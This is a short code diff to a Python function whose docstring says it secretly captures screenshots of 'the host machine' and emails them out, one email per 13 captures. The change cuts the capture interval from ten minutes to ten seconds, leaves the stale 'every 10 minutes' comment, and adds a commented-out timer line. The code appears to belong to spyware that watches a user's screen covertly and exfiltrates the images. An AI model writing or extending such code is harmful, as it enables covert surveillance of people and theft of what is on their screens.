@@ -15,6 +15,7 @@ def capture_screenshots(file_path):
         the host machine and send them by email.
         Every 13 captures image, an email is sent"""
 
+    #threading.Timer(5,capture_screenshots, [file_path]).start()
     
     # using DPI aware to capture a full screenshot
     user32 = windll.user32
@@ -27,7 +28,7 @@ def capture_screenshots(file_path):
 
     while True:
 
-        time.sleep(60 * 10) #evey 10 minutes
+        time.sleep(10) #evey 10 minutes
         image = ImageGrab.grab() # grab the image
         save_as = os.path.join(file_path,'ScreenShot_' +time.strftime('%Y_%m_%d') + str(counter) + '.jpg') 
         image.save(save_as)
